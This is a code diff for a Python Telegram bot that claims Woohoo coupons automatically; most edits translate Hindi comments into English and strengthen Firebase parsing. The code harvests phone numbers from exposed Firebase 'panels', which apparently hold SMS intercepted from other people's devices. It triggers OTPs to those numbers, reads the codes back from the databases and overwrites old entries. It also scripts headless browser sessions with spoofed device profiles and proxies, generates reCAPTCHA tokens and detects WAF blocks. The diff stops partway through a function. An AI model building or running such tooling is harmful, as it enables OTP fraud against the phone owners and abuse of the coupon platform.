@@ -45,12 +45,12 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-CLAIMS_DATA_FILE = "claimed_coupons.json"  # Direct Mobile और Firebase दोनों से क्लेम हुए कूपन का डेटा
-MAX_DIRECT_LINKS = 20  # 20 से ज़्यादा links पर .txt या .zip file मांगेगा
-MAX_CONCURRENT_REQUESTS = 10  # एक साथ 10 URLs check करने की speed
-MAX_FIREBASE_UPI_USES = 8  # एक फ्रेश UPI ID के लिए फिक्स यूज़ लिमिट
-MAX_SEND_RETRIES = 2  # एक नंबर पर अधिकतम 2 बार OTP भेजने का प्रयास
-WAIT_SECONDS = 5  # हर प्रयास के बाद 5 सेकंड का इंतजार
+CLAIMS_DATA_FILE = "claimed_coupons.json"  # Stores claimed coupon logs from both Direct Mobile and Firebase flows
+MAX_DIRECT_LINKS = 20  # Requires a .txt or .zip file if more than 20 links are submitted
+MAX_CONCURRENT_REQUESTS = 10  # Concurrency limit for checking Firebase URLs
+MAX_FIREBASE_UPI_USES = 8  # Fixed usage limit per fresh UPI ID
+MAX_SEND_RETRIES = 2  # Maximum OTP send attempts per online mobile number
+WAIT_SECONDS = 5  # Wait duration in seconds per OTP check cycle
 
 file_lock = asyncio.Lock()
 
@@ -131,7 +131,7 @@ def get_user_lock(chat_id: int) -> asyncio.Lock:
 
 
 async def get_unjoined_channels(bot, user_id: int) -> list[dict]:
-    """चेक करता है कि यूज़र ने कौन-कौन से चैनल्स/ग्रुप्स जॉइन नहीं किए हैं।"""
+    """Checks which required Telegram channels/groups the user has not joined yet."""
     unjoined = []
     for channel_id, info in CHANNELS.items():
         try:
@@ -144,7 +144,7 @@ async def get_unjoined_channels(bot, user_id: int) -> list[dict]:
 
 
 def build_join_keyboard(unjoined_channels: list[dict]) -> InlineKeyboardMarkup:
-    """सिर्फ बाकी बचे हुए चैनल्स के बटन और Verify बटन बनाता है।"""
+    """Builds inline buttons for remaining unjoined channels and a verification button."""
     keyboard = []
     for ch in unjoined_channels:
         keyboard.append([InlineKeyboardButton(text=ch["name"], url=ch["url"])])
@@ -153,7 +153,7 @@ def build_join_keyboard(unjoined_channels: list[dict]) -> InlineKeyboardMarkup:
 
 
 async def ensure_user_subscribed(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """अगर यूज़र ने सभी चैनल्स जॉइन नहीं किए हैं तो Access Denied दिखाकर जॉइन बटन भेजता है।"""
+    """Sends an Access Denied prompt with join buttons if the user hasn't joined all required channels."""
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
 
@@ -164,9 +164,9 @@ async def ensure_user_subscribed(update: Update, context: ContextTypes.DEFAULT_T
     await close_user_session(chat_id)
     reply_markup = build_join_keyboard(unjoined)
     msg_text = (
-        "🚫 **Access Denied!**\n\n"
-        "Bot ko use karne ke liye neeche diye gaye sabhi channels aur group join karna compulsory hai.\n"
-        "Join karne ke baad **'✅ Verify Membership'** par click karein:"
+        "🚫 **Access Denied**\n\n"
+        "To use this bot, you must join all required channels and the community group listed below.\n"
+        "After joining, click **'✅ Verify Membership'** to continue:"
     )
     if update.callback_query:
         try:
@@ -179,7 +179,7 @@ async def ensure_user_subscribed(update: Update, context: ContextTypes.DEFAULT_T
 
 
 async def get_shared_browser(headless: bool = True) -> Browser:
-    """एक ही Global Chromium Browser instance को initialize और reuse करता है।"""
+    """Initializes and reuses a single global Chromium browser instance."""
     global global_playwright, global_browser
     async with browser_init_lock:
         if global_browser and global_browser.is_connected():
@@ -208,8 +208,8 @@ async def get_shared_browser(headless: bool = True) -> Browser:
 
 class UnifiedSessionClient:
     """
-    Global Chromium Browser के अंदर प्रत्येक यूज़र के लिए isolated BrowserContext
-    का उपयोग करके multi-step form/API workflow और डायनामिक टोकन को हैंडल करता है।
+    Handles multi-step form/API workflows and dynamic tokens using an isolated
+    BrowserContext per user inside the shared global Chromium instance.
     """
 
     def __init__(self, base_url: str, device_profile: dict, proxy_cfg: Optional[dict] = None, headless: bool = True):
@@ -223,7 +223,7 @@ class UnifiedSessionClient:
         self.page: Optional[Page] = None
 
     async def start(self):
-        """Shared Browser में नया isolated Context और Page initialize करता है।"""
+        """Initializes a new isolated Context and Page inside the shared Browser."""
         browser = await get_shared_browser(headless=self.headless)
 
         is_mobile = self.device_profile.get("is_mobile", False)
@@ -255,9 +255,9 @@ class UnifiedSessionClient:
         self.page = await self.context.new_page()
 
     async def load_initial_page(self) -> dict:
-        """Main page load करता है, cookies set करता है, और CSRF token व state options निकालता है।"""
+        """Loads the main page, sets cookies, and extracts the CSRF token and available state options."""
         if not self.page:
-            raise RuntimeError("Session start nahi hua hai. Pehle start() call karein.")
+            raise RuntimeError("Session has not been started. Call start() first.")
 
         await self.page.goto(self.base_url, wait_until="domcontentloaded", timeout=20000)
 
@@ -297,8 +297,8 @@ class UnifiedSessionClient:
         action: str = "submit",
     ) -> str:
         """
-        DOM ([data-sitekey]), iframe (?k=), या script से site_key ऑटो-डिटेक्ट करके
-        reCAPTCHA token निकालता है।
+        Auto-detects site_key from DOM ([data-sitekey]), iframe (?k=), or script tags
+        and executes reCAPTCHA to obtain a fresh token.
         """
         if not self.page:
             return ""
@@ -307,13 +307,13 @@ class UnifiedSessionClient:
             """async ({ fallbackKey, actionName }) => {
                 let detectedKey = "";
 
-                // 1. DOM से data-sitekey ऑटो-डिटेक्ट करें
+                // 1. Auto-detect data-sitekey from DOM
                 const keyEl = document.querySelector('[data-sitekey]');
                 if (keyEl && keyEl.getAttribute('data-sitekey')) {
                     detectedKey = keyEl.getAttribute('data-sitekey');
                 }
 
-                // 2. iframe URL से 'k' parameter निकालें
+                // 2. Extract 'k' parameter from iframe URL
                 if (!detectedKey) {
                     const iframe = document.querySelector('iframe[src*="recaptcha"]');
                     if (iframe && iframe.src) {
@@ -325,7 +325,7 @@ class UnifiedSessionClient:
                     }
                 }
 
-                // 3. Script tag के render parameter से की (key) चेक करें
+                // 3. Extract render key from script tag
                 if (!detectedKey) {
                     const scriptEl = document.querySelector('script[src*="recaptcha/api.js"]');
                     if (scriptEl && scriptEl.src) {
@@ -341,7 +341,7 @@ class UnifiedSessionClient:
 
                 const finalSiteKey = detectedKey || fallbackKey;
 
-                // 4. v3 grecaptcha available है तो token generate करें
+                // 4. Execute v3 grecaptcha if available
                 if (window.grecaptcha && typeof window.grecaptcha.execute === 'function' && finalSiteKey) {
                     try {
                         return await new Promise((resolve) => {
@@ -359,7 +359,7 @@ class UnifiedSessionClient:
                     }
                 }
 
-                // 5. Fallback: DOM textarea/input चेक करें
+                // 5. Fallback: inspect DOM textarea/input
                 const el = document.querySelector('textarea[name="g-recaptcha-response"], input[name="g-recaptcha-response"]');
                 return el && el.value ? el.value : "";
             }""",
@@ -369,11 +369,11 @@ class UnifiedSessionClient:
 
     async def post_step(self, endpoint: str, form_data: dict) -> dict:
         """
-        Browser page के native fetch() का उपयोग करके रिक्वेस्ट भेजता है
-        ताकि असली cookies, User-Agent, और sec-ch-ua headers ऑटोमैटिक सिंक रहें।
+        Submits a POST request using the browser page's native fetch() API so that
+        cookies, User-Agent, and sec-ch-ua headers remain automatically synchronized.
         """
         if not self.page:
-            raise RuntimeError("Page available nahi hai.")
+            raise RuntimeError("Browser page is not available.")
 
         url = endpoint if endpoint.startswith("http") else f"{self.base_url}/{endpoint.lstrip('/')}"
 
@@ -419,7 +419,7 @@ class UnifiedSessionClient:
         }
 
     async def close(self):
-        """सिर्फ इस सेशन का Page और Context cleanly close करता है (Global Browser चलता रहेगा)।"""
+        """Cleanly closes only this session's Page and Context while keeping the Global Browser active."""
         for resource_close in (
             self.page.close if self.page else None,
             self.context.close if self.context else None,
@@ -435,32 +435,32 @@ class UnifiedSessionClient:
 
 async def safe_post_json(client: UnifiedSessionClient, url: str, payload: dict) -> dict:
     """
-    POST रिक्वेस्ट भेजता है, HTTP स्टेटस कोड (200 OK) और HTML/WAF रिस्पॉन्स की जांच करता है।
+    Sends a POST request and validates HTTP 200 OK status as well as JSON vs HTML/WAF responses.
     """
     res = await client.post_step(url, payload)
 
     if res["status"] != 200:
-        raise RuntimeError(f"HTTP {res['status']}: Server ne request reject kar di.")
+        raise RuntimeError(f"HTTP {res['status']}: The server rejected the request.")
 
     data = res["data"]
     if isinstance(data, dict) and "raw" in data and len(data) == 1:
         raw_content = data["raw"].strip()
         if raw_content.startswith("<") or "<html" in raw_content.lower():
-            raise RuntimeError("Server ya security firewall (WAF) ne session block kar diya hai ya session expire ho gaya hai.")
-        raise RuntimeError("Server se invalid (Non-JSON) response mila hai.")
+            raise RuntimeError("The server or security firewall (WAF) blocked the session, or the session expired.")
+        raise RuntimeError("Received an invalid (non-JSON) response from the server.")
 
     return data
 
 
 async def close_user_session(chat_id: int):
-    """मौजूदा सेशन को सुरक्षित रूप से बंद और डिलीट करता है"""
+    """Safely closes and removes an active user session."""
     session = user_sessions.pop(chat_id, None)
     if session and "client" in session:
         await session["client"].close()
 
 
 async def cleanup_loop():
-    """हर 60 सेकंड में निष्क्रिय (inactive) सेशन्स को बंद करके RAM लीक रोकता है।"""
+    """Closes inactive sessions every 60 seconds to prevent memory leaks."""
     while True:
         try:
             await asyncio.sleep(60)
@@ -486,7 +486,7 @@ async def cleanup_loop():
 
 
 async def on_startup(application: Application):
-    """बॉट स्टार्ट होने पर Left Side Blue Menu Button में शॉर्टकट कमांड्स सेट करता है, और Global Browser व क्लीनअप टास्क चालू करता है।"""
+    """Configures bot menu commands, initializes the shared browser, and starts the cleanup loop."""
     global cleanup_task
     await application.bot.delete_my_commands()
     await application.bot.set_my_commands(
@@ -501,7 +501,7 @@ async def on_startup(application: Application):
 
 
 async def on_shutdown(application: Application):
-    """बॉट बंद होने पर सारे सेशन्स और Global Browser cleanly बंद करता है।"""
+    """Cleanly shuts down all active sessions and the shared browser instance."""
     global global_playwright, global_browser, cleanup_task
 
     if cleanup_task and not cleanup_task.done():
@@ -531,7 +531,7 @@ async def on_shutdown(application: Application):
 
 
 async def init_user_session(chat_id: int) -> bool:
-    """पुराने सेशन को बंद करके नया UnifiedSessionClient बनाता है (प्रॉक्सी फॉलबैक और हार्ड टाइमआउट सहित)"""
+    """Closes any previous session and initializes a new UnifiedSessionClient with proxy fallback."""
     await close_user_session(chat_id)
 
     selected_device = random.choice(DEVICE_PROFILES)
@@ -595,81 +595,218 @@ async def init_user_session(chat_id: int) -> bool:
 
 
 # ==========================================
-# 3. FIREBASE STATUS CHECKER
+# 3. FIREBASE STATUS CHECKER (FIXED)
 # ==========================================
-def check_firebase_sms_status(firebase_url: str) -> str:
-    """Firebase URL के node पर जाकर active/inactive status check करता है।"""
-    base_url = firebase_url.rstrip('/')
-    if not base_url.endswith('.json'):
-        target_url = f"{base_url}/sms.json"
-    else:
-        target_url = base_url
+def _build_firebase_query_url(firebase_url: str, node_suffix: str = "") -> str:
+    """
+    Safely constructs a valid Firebase REST API URL (.json) while preserving
+    any query parameters such as ?auth=... and fixing malformed /json paths.
+    """
+    parsed = urlparse(firebase_url.strip())
+    path = parsed.path or ""
 
-    try:
-        response = requests.get(target_url, timeout=15)
-        response.raise_for_status()
-        data = response.json()
+    # Fix malformed trailing '/json' (missing dot) -> '/.json'
+    if path.endswith("/json") and not path.endswith("/.json"):
+        path = path[:-5] + "/.json"
 
-        if not data:
-            return "Inactive (Database खाली है)"
-
-        timestamps = []
-        items = data.values() if isinstance(data, dict) else data
-
-        for item in items:
-            if isinstance(item, dict):
-                ts = item.get('timestamp') or item.get('date') or item.get('time')
-                if ts is not None:
-                    try:
-                        timestamps.append(float(ts))
-                    except (ValueError, TypeError):
-                        continue
-
-        if not timestamps:
-            return "Inactive (कोई valid timestamp नहीं मिला)"
-
-        latest_ts = max(timestamps)
-        latest_ts_sec = latest_ts / 1000.0 if latest_ts > 1e11 else latest_ts
-
-        current_time_sec = time.time()
-        time_diff = current_time_sec - latest_ts_sec
-
-        if 0 <= time_diff <= 600:
-            return f"Active (आखिरी SMS {int(time_diff)} सेकंड पहले आया था)"
+    if not path.endswith(".json"):
+        clean_path = path.rstrip("/")
+        if node_suffix:
+            clean_suffix = node_suffix.lstrip("/")
+            path = f"{clean_path}/{clean_suffix}" if clean_path else f"/{clean_suffix}"
         else:
-            return f"Inactive (आखिरी SMS {int(time_diff // 60)} मिनट पहले आया था)"
+            path = f"{clean_path}/.json" if clean_path else "/.json"
 
-    except requests.exceptions.HTTPError as e:
-        if e.response is not None and e.response.status_code == 401:
-            return "Error: Permission Denied (Firebase rules private हैं)"
-        return f"HTTP Error: {e}"
-    except Exception as e:
-        return f"Error: {e}"
+    rebuilt = parsed._replace(path=path)
+    return rebuilt.geturl()
+
+
+def _parse_any_timestamp_to_seconds(ts_val) -> Optional[float]:
+    """Converts numeric epoch (sec/ms/us) or ISO/date string timestamps into Unix seconds."""
+    if ts_val is None or isinstance(ts_val, bool):
+        return None
+
+    if isinstance(ts_val, (int, float)):
+        val = float(ts_val)
+        if val <= 0:
+            return None
+        if val > 1e14:      # microseconds
+            return val / 1e6
+        if val > 1e11:      # milliseconds
+            return val / 1000.0
+        if val > 1e9:       # seconds (valid modern epoch)
+            return val
+        return None
+
+    if isinstance(ts_val, str):
+        s = ts_val.strip()
+        if not s:
+            return None
+        if s.isdigit():
+            return _parse_any_timestamp_to_seconds(float(s))
+        for fmt in (
+            "%Y-%m-%dT%H:%M:%S.%fZ",
+            "%Y-%m-%dT%H:%M:%SZ",
+            "%Y-%m-%dT%H:%M:%S",
+            "%Y-%m-%d %H:%M:%S",
+            "%d-%m-%Y %H:%M:%S",
+            "%d/%m/%Y %H:%M:%S",
+            "%Y/%m/%d %H:%M:%S",
+        ):
+            try:
+                return datetime.strptime(s, fmt).timestamp()
+            except ValueError:
+                continue
+        try:
+            return datetime.fromisoformat(s.replace("Z", "+00:00")).timestamp()
+        except Exception:
+            return None
+
+    return None
+
+
+def _collect_timestamps_and_activity_recursive(obj, timestamps: list[float], state_flags: dict) -> None:
+    """
+    Recursively traverses the entire Firebase JSON tree (including nested sms/messages/devices nodes)
+    to gather all valid timestamps and online/active indicators.
+    """
+    ts_keys = {
+        "timestamp", "date", "time", "createdat", "created_at",
+        "updatedat", "updated_at", "lastseen", "last_seen",
+        "ping", "heartbeat", "smstime", "sms_time", "receivedat", "received_at",
+    }
+
+    if isinstance(obj, dict):
+        if _is_firebase_node_online(obj):
+            state_flags["has_online_node"] = True
+
+        for k, v in obj.items():
+            k_lower = str(k).lower()
+
+            # Check if key itself is an epoch timestamp
+            key_ts = _parse_any_timestamp_to_seconds(k)
+            if key_ts is not None:
+                timestamps.append(key_ts)
+
+            if k_lower in ts_keys or "time" in k_lower or "date" in k_lower:
+                parsed_ts = _parse_any_timestamp_to_seconds(v)
+                if parsed_ts is not None:
+                    timestamps.append(parsed_ts)
+            elif isinstance(v, (int, float)) and v > 1e11:
+                parsed_ts = _parse_any_timestamp_to_seconds(v)
+                if parsed_ts is not None:
+                    timestamps.append(parsed_ts)
+
+            if isinstance(v, (dict, list)):
+                _collect_timestamps_and_activity_recursive(v, timestamps, state_flags)
+
+    elif isinstance(obj, list):
+        for item in obj:
+            _collect_timestamps_and_activity_recursive(item, timestamps, state_flags)
+
+
+def check_firebase_sms_status(firebase_url: str) -> str:
+    """
+    Checks whether a Firebase endpoint is Active or Inactive by inspecting both
+    the exact endpoint (.json) and /sms.json (preserving ?auth=... tokens),
+    and scanning nested JSON structures for timestamps or active device nodes.
+    """
+    candidate_urls = []
+    exact_json_url = _build_firebase_query_url(firebase_url, "")
+    candidate_urls.append(exact_json_url)
+
+    parsed = urlparse(firebase_url.strip())
+    if not parsed.path.endswith(".json"):
+        sms_json_url = _build_firebase_query_url(firebase_url, "sms.json")
+        if sms_json_url not in candidate_urls:
+            candidate_urls.append(sms_json_url)
+
+    last_http_error = None
+    found_any_json_data = False
+    all_timestamps: list[float] = []
+    state_flags = {"has_online_node": False}
+
+    for target_url in candidate_urls:
+        try:
+            response = requests.get(target_url, timeout=15)
+            response.raise_for_status()
+            data = response.json()
+
+            if data is not None and data != {} and data != []:
+                found_any_json_data = True
+                _collect_timestamps_and_activity_recursive(data, all_timestamps, state_flags)
+                if all_timestamps or state_flags["has_online_node"]:
+                    break
+
+        except requests.exceptions.HTTPError as e:
+            if e.response is not None and e.response.status_code == 401:
+                last_http_error = "Error: Permission Denied (Firebase rules are private)"
+            elif e.response is not None:
+                last_http_error = f"HTTP Error: {e.response.status_code} ({e.response.reason})"
+            else:
+                last_http_error = f"HTTP Error: {e}"
+        except Exception as e:
+            last_http_error = f"Error: {e}"
+
+    if all_timestamps:
+        latest_ts_sec = max(all_timestamps)
+        time_diff = time.time() - latest_ts_sec
+
+        if time_diff <= 600:
+            secs = max(0, int(time_diff))
+            return f"Active (Last SMS/activity {secs}s ago)"
+        else:
+            mins = int(time_diff // 60)
+            return f"Inactive (Last SMS/activity {mins} min ago)"
+
+    if state_flags["has_online_node"] or found_any_json_data:
+        return "Active (Live JSON data accessible)"
+
+    if last_http_error:
+        return last_http_error
+
+    return "Inactive (Database is empty)"
 
 
 # ==========================================
 # 4. EXTRACTION, FILE & CLAIM LEADERBOARD HELPERS
 # ==========================================
 def extract_urls_from_text(text: str) -> list[str]:
-    """Text में से सभी clean और unique URLs निकालता है।"""
+    """Extracts clean, unique URLs from text."""
     url_pattern = r'https?://[^\s<>"]+|www\.[^\s<>"]+'
     raw_urls = re.findall(url_pattern, text, re.IGNORECASE)
     cleaned_urls = [url.rstrip('.,;:!?)\']}') for url in raw_urls]
     return list(dict.fromkeys(cleaned_urls))
 
 
+def _normalize_extracted_firebase_url(raw_fb_url: str) -> str:
+    """
+    Cleans extracted Firebase URLs while preserving '.json' and query parameters
+    (like '?auth=...') and fixing malformed '/json' suffixes.
+    """
+    parsed = urlparse(raw_fb_url.strip())
+    path = parsed.path or ""
+
+    if path.endswith("/json") and not path.endswith("/.json"):
+        path = path[:-5] + "/.json"
+    elif path != "/.json" and not path.endswith(".json"):
+        path = path.rstrip("/")
+
+    return parsed._replace(path=path).geturl()
+
+
 def extract_firebase_from_url(target_url: str) -> str | None:
-    """Direct Firebase URL या Base64 parameter वाले Panel URL से Firebase link निकालता है।"""
+    """Extracts a Firebase Realtime Database URL directly or from Base64-encoded panel parameters."""
     if not target_url.lower().startswith(("http://", "https://")):
         target_url = "https://" + target_url
 
     parsed = urlparse(target_url)
     params = parse_qs(parsed.query)
-    firebase_pattern = r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|firebasedatabase\.app)(?:/[^\s?#]*)?'
+    firebase_pattern = r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|firebasedatabase\.app)(?:/[^\s#]*)?'
 
     direct_match = re.search(firebase_pattern, target_url, re.IGNORECASE)
     if direct_match:
-        return direct_match.group(0).rstrip('/')
+        return _normalize_extracted_firebase_url(direct_match.group(0))
 
     for _, values in params.items():
         for val in values:
@@ -681,7 +818,7 @@ def extract_firebase_from_url(target_url: str) -> str | None:
 
                 match = re.search(firebase_pattern, decoded_text, re.IGNORECASE)
                 if match:
-                    return match.group(0).rstrip('/')
+                    return _normalize_extracted_firebase_url(match.group(0))
             except Exception:
                 continue
 
@@ -690,7 +827,7 @@ def extract_firebase_from_url(target_url: str) -> str | None:
 
 def filter_valid_firebase_urls(urls: list[str]) -> tuple[list[tuple[str, str]], int]:
     """
-    केवल valid Firebase/Panel URLs को ही फिल्टर करके रखता है।
+    Filters and retains only valid Firebase/Panel URLs.
     Returns: ([(original_url, extracted_firebase_url), ...], rejected_count)
     """
     valid_pairs = []
@@ -707,7 +844,7 @@ def filter_valid_firebase_urls(urls: list[str]) -> tuple[list[tuple[str, str]], 
 
 
 def extract_numbers_and_otps(text: str) -> dict:
-    """Text या SMS में से 10-digit Indian mobile numbers और 4-8 digit OTPs निकालता है।"""
+    """Extracts 10-digit Indian mobile numbers and 4-8 digit OTPs from text or SMS payloads."""
     number_pattern = r'(?<!\d)(?:\+91[\-\s]?|91[\-\s]?|0)?([6-9]\d{9})(?!\d)'
     otp_pattern = r'(?:OTP|code|pin|passcode|password|verification|ओटीपी|कोड)[^\d\n]{0,25}(\d{4,8})\b'
 
@@ -721,7 +858,7 @@ def extract_numbers_and_otps(text: str) -> dict:
 
 
 def extract_coupon_codes_from_text(text: str) -> list[str]:
-    """Text या .txt file से unique coupon codes निकालता है (single, sequence या line-by-line)।"""
+    """Extracts unique alphanumeric coupon codes from text or a .txt file."""
     raw_tokens = re.split(r'[\s,;|]+', text.strip())
     coupons = []
     for token in raw_tokens:
@@ -733,13 +870,13 @@ def extract_coupon_codes_from_text(text: str) -> list[str]:
 
 
 def is_valid_upi_format(upi_id: str) -> bool:
-    """UPI ID का strict format (username@bankhandle) चेक करता है।"""
+    """Validates strict UPI ID format (username@bankhandle)."""
     upi_pattern = r'^[a-zA-Z0-9][a-zA-Z0-9.\-_]{1,254}@[a-zA-Z0-9]{2,64}$'
     return bool(re.match(upi_pattern, upi_id))
 
 
 def _is_firebase_node_offline(node: dict) -> bool:
-    """चेक करता है कि Firebase का डिवाइस/सेशन नोड offline तो नहीं है (offline सेशन पर OTP नहीं मिलता)।"""
+    """Checks whether a Firebase device/session node is marked offline."""
     status_val = str(
         node.get("status")
         or node.get("state")
@@ -765,7 +902,7 @@ def _is_firebase_node_offline(node: dict) -> bool:
 
 
 def _is_firebase_node_online(node: dict) -> bool:
-    """चेक करता है कि Firebase का डिवाइस/सेशन नोड स्पष्ट रूप से online है या नहीं।"""
+    """Checks whether a Firebase device/session node is explicitly online or recently active."""
     if _is_firebase_node_offline(node):
         return False
 
@@ -787,26 +924,21 @@ def _is_firebase_node_online(node: dict) -> bool:
             if val is True or str(val).strip().lower() in ("true", "1", "yes", "online"):
                 return True
 
-    # अगर node में recent lastSeen / ping / timestamp (10 मिनट के अंदर) है तो online मानें
     for ts_key in ("lastSeen", "last_seen", "ping", "heartbeat", "updatedAt", "timestamp"):
         ts = node.get(ts_key)
         if ts is not None:
-            try:
-                ts_val = float(ts)
-                ts_sec = ts_val / 1000.0 if ts_val > 1e11 else ts_val
-                if 0 <= (time.time() - ts_sec) <= 600:
-                    return True
-            except (ValueError, TypeError):
-                continue
+            parsed_sec = _parse_any_timestamp_to_seconds(ts)
+            if parsed_sec is not None and 0 <= (time.time() - parsed_sec) <= 600:
+                return True
 
     return False
 
 
 def _extract_online_numbers_from_tree(obj, inherited_offline: bool = False, inherited_online: bool = False) -> list[str]:
     """
-    Firebase JSON tree को स्कैन करता है:
-    - 'offline' सेशन/ब्रांच को पूरी तरह स्किप करता है।
-    - केवल 'online' सेशन/डिवाइस से ही 10-digit Indian mobile numbers निकालता है।
+    Scans a Firebase JSON tree:
+    - Skips any 'offline' session/branch completely.
+    - Extracts 10-digit Indian mobile numbers exclusively from 'online' sessions/devices.
     """
     number_pattern = r'(?<!\d)(?:\+91[\-\s]?|91[\-\s]?|0)?([6-9]\d{9})(?!\d)'
     results = []
@@ -824,7 +956,6 @@ def _extract_online_numbers_from_tree(obj, inherited_offline: bool = False, inhe
 
             branch_online = node_online or ("online" in key_lower)
 
-            # अगर key खुद एक 10-digit मोबाइल नंबर है और यह सेशन online है
             if branch_online:
                 key_nums = re.findall(number_pattern, str(key))
                 for n in key_nums:
@@ -860,74 +991,79 @@ def _extract_online_numbers_from_tree(obj, inherited_offline: bool = False, inhe
     return results
 
 
+def _get_firebase_root_and_query(firebase_url: str) -> tuple[str, str]:
+    """Splits a Firebase URL into its clean root URL and optional query string (e.g., auth=...)."""
+    parsed = urlparse(firebase_url.strip())
+    path = parsed.path or ""
+    if path.endswith("/.json"):
+        path = path[:-6]
+    elif path.endswith("/json"):
+        path = path[:-5]
+    elif path.endswith(".json"):
+        path = path[:-5]
+    root = parsed._replace(path=path.rstrip("/"), query="").geturl()
+    return root, parsed.query
+
+
 def get_online_numbers(firebase_url: str) -> list[dict]:
-    """
-    Firebase से केवल उन्हीं नंबरों की लिस्ट निकालता है जिनका status 'online' है।
-    नोट: अपने Firebase के नोड (node) नाम के अनुसार '/numbers.json' को बदल लें।
-    """
-    base = firebase_url.rstrip('/')
-    root_url = base[:-5] if base.endswith('.json') else base
+    """Fetches numbers with 'online' status from Firebase /numbers.json."""
+    root_url, query = _get_firebase_root_and_query(firebase_url)
+    target = f"{root_url}/numbers.json" + (f"?{query}" if query else "")
     try:
-        res = requests.get(f"{root_url}/numbers.json", timeout=10)
+        res = requests.get(target, timeout=10)
         if res.status_code == 200 and res.json():
             data = res.json()
             online_list = []
 
-            # यदि डेटा dictionary (dict) फॉर्मेट में है
             if isinstance(data, dict):
                 for key, info in data.items():
                     if isinstance(info, dict) and str(info.get("status", "")).lower() == "online":
-                        # नंबर या उसकी key को सेव करें
                         num = info.get("number") or info.get("phone") or key
                         online_list.append({"id": key, "number": str(num)})
             return online_list
     except Exception as e:
-        print(f"  [Error] Firebase से नंबर लाने में समस्या ({root_url}): {e}")
+        print(f"  [Error] Failed to fetch online numbers from Firebase ({root_url}): {e}")
     return []
 
 
 def trigger_otp_send(number: str, otp_sender_fn: Optional[Callable[[str], bool]] = None) -> bool:
     """
-    दिए गए मोबाइल नंबर पर वास्तविक OTP भेजने वाले callback (otp_sender_fn) को कॉल करता है।
-    (Woohoo पर वास्तविक OTP भेजने का पूरा लॉजिक auto_claim_triplet_on_woohoo में संभाला जाता है।)
+    Invokes the actual OTP trigger callback (otp_sender_fn) for the target mobile number.
+    (Full Woohoo OTP dispatch is handled inside auto_claim_triplet_on_woohoo.)
     """
-    print(f"  -> {number} पर OTP भेजा जा रहा है...")
+    print(f"  -> Triggering OTP send to {number}...")
     if callable(otp_sender_fn):
         try:
             return bool(otp_sender_fn(number))
         except Exception as e:
-            print(f"  [Error] {number} पर OTP भेजने में समस्या: {e}")
+            print(f"  [Error] Failed to trigger OTP for {number}: {e}")
             return False
     return False
 
 
 def check_otp_in_firebase(firebase_url: str, number_id: str) -> Optional[str]:
-    """
-    5 सेकंड तक हर 1 सेकंड में Firebase चेक करता है कि उस नंबर पर नया OTP आया या नहीं।
-    """
-    base = firebase_url.rstrip('/')
-    root_url = base[:-5] if base.endswith('.json') else base
+    """Polls Firebase every 1 second for up to WAIT_SECONDS (5s) for a newly arrived OTP."""
+    root_url, query = _get_firebase_root_and_query(firebase_url)
+    target = f"{root_url}/numbers/{number_id}/otp.json" + (f"?{query}" if query else "")
     for _ in range(WAIT_SECONDS):
         try:
-            # अपने Firebase के OTP पाथ के अनुसार इसे बदलें
-            res = requests.get(f"{root_url}/numbers/{number_id}/otp.json", timeout=5)
+            res = requests.get(target, timeout=5)
             if res.status_code == 200:
                 otp_val = res.json()
-                # यदि OTP मौजूद है और खाली नहीं है
                 if otp_val and str(otp_val).strip() != "":
                     return str(otp_val).strip()
         except Exception:
             pass
-        time.sleep(1)  # 1 सेकंड रुककर दोबारा चेक करें (कुल 5 सेकंड तक)
+        time.sleep(1)
     return None
 
 
 def clear_old_otp(firebase_url: str, number_id: str) -> None:
-    """नया OTP भेजने से पहले पुराने OTP को साफ करता है ताकि पुराना OTP रीड न हो।"""
-    base = firebase_url.rstrip('/')
-    root_url = base[:-5] if base.endswith('.json') else base
+    """Clears stale OTP entries before dispatching a new OTP."""
+    root_url, query = _get_firebase_root_and_query(firebase_url)
+    target = f"{root_url}/numbers/{number_id}.json" + (f"?{query}" if query else "")
     try:
-        requests.patch(f"{root_url}/numbers/{number_id}.json", json={"otp": ""}, timeout=5)
+        requests.patch(target, json={"otp": ""}, timeout=5)
     except Exception:
         pass
 
@@ -938,67 +1074,69 @@ def process_all_panels(
     otp_sender_fn: Optional[Callable[[str], bool]] = None,
 ) -> Optional[dict]:
     """
-    सभी Active Firebase URLs और उनके 'online' नंबरों को चेक करता है:
-    - प्रत्येक online नंबर पर अधिकतम MAX_SEND_RETRIES (2) बार प्रयास करता है
-    - प्रत्येक प्रयास पर पुराना OTP साफ करके नया OTP ट्रिगर करता है और WAIT_SECONDS (5s) तक चेक करता है
-    - OTP न मिलने पर अगले online नंबर और फिर अगले Firebase URL पर स्विच करता है।
+    Iterates through all Active Firebase URLs and their 'online' numbers:
+    - Attempts up to MAX_SEND_RETRIES (2) per online number
+    - Clears stale OTP, triggers a fresh OTP, and polls for WAIT_SECONDS (5s)
+    - Automatically switches to the next online number or Firebase URL on timeout.
     """
     if used_numbers is None:
         used_numbers = []
 
     for fb_url in firebase_urls:
         print(f"\n==========================================")
-        print(f"पैनल चेक किया जा रहा है: {fb_url}")
+        print(f"Checking panel: {fb_url}")
 
         online_numbers = get_online_numbers(fb_url)
         if not online_numbers:
-            print("-> इस पैनल में कोई भी नंबर 'online' नहीं है। अगले URL पर जा रहे हैं...")
+            print("-> No 'online' numbers found in this panel. Moving to next URL...")
             continue
 
-        print(f"-> कुल {len(online_numbers)} ऑनलाइन नंबर मिले।")
+        print(f"-> Found {len(online_numbers)} online numbers.")
 
-        # पहले उन online नंबरों को प्राथमिकता दें जो पहले यूज़ नहीं हुए हैं
         fresh_items = [it for it in online_numbers if it["number"] not in used_numbers]
         ordered_items = fresh_items if fresh_items else online_numbers
 
         for item in ordered_items:
             num_id = item["id"]
             phone = item["number"]
-            print(f"\n[सक्रिय नंबर]: {phone} (ID: {num_id})")
+            print(f"\n[Active Number]: {phone} (ID: {num_id})")
 
-            # एक नंबर पर अधिकतम 2 बार प्रयास का लूप
             for attempt in range(1, MAX_SEND_RETRIES + 1):
-                print(f"  प्रयास {attempt}/{MAX_SEND_RETRIES}:")
+                print(f"  Attempt {attempt}/{MAX_SEND_RETRIES}:")
 
-                # पुराना OTP साफ करें और नया OTP ट्रिगर करें
                 clear_old_otp(fb_url, num_id)
                 sent_ok = trigger_otp_send(phone, otp_sender_fn=otp_sender_fn)
                 if not sent_ok:
